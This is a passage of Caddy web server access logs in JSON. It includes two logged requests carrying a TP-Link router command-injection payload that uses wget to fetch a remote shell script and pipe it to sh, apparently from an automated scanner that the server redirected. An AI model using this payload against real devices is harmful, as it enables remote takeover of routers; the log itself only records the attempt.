zstd"],"X-Forwarded-Proto":["https"],"X-Forwarded-Host":["kairang.pe.kr:8443"],"Origin":["https://kairang.pe.kr:8443"],"Sec-Fetch-Mode":["cors"],"Sec-Ch-Ua-Platform":["\"Windows\""],"Sec-Fetch-Site":["same-origin"],"Accept-Language":["ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7"],"Pragma":["no-cache"],"Cookie":["REDACTED"],"Accept":["*/*"],"Sec-Ch-Ua-Mobile":["?0"],"Via":["2.0 Caddy"],"Sec-Ch-Ua":["\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\""],"Sec-Fetch-Dest":["script"],"Referer":["https://kairang.pe.kr:8443/"],"Priority":["u=1"],"X-Forwarded-For":["112.223.35.142"]},"tls":{"resumed":true,"version":772,"cipher_suite":4865,"proto":"h2","server_name":"kairang.pe.kr","ech":false}},"error":"reading: context canceled"}
{"level":"info","ts":1784886839.4067082,"logger":"http.log.access","msg":"handled request","request":{"remote_ip":"221.159.119.6","remote_port":"50598","client_ip":"221.159.119.6","proto":"HTTP/1.1","method":"GET","host":"121.135.177.38:80","uri":"/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget%20http%3A//0.0.0.0/router.tplink.sh%20-O-%7Csh)","headers":{}},"bytes_read":0,"user_id":"","duration":0.0007865,"size":0,"status":308,"resp_headers":{"Server":["Caddy"],"Connection":["close"],"Location":["https://121.135.177.38/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget%20http%3A//0.0.0.0/router.tplink.sh%20-O-%7Csh)"],"Content-Type":[]}}
{"level":"info","ts":1784886839.4813423,"logger":"http.log.access","msg":"handled request","request":{"remote_ip":"221.159.119.6","remote_port":"50629","client_ip":"221.159.119.6","proto":"HTTP/1.1","method":"GET","host":"121.135.177.38:80","uri":"/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget%20http%3A//0.0.0.0/router.tplink.sh%20-O-%7Csh)","headers":{}},"bytes_read":0,"user_id":"","duration":0,"size":0,"status":308,"resp_headers":{"Server":["Caddy"],"Connection":["close"],"Location":["https://121.135.177.38/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget%20http%3A//0.0.0.0/router.tplink.sh%20-O-%7Csh)"],"Content-Type":[]}}
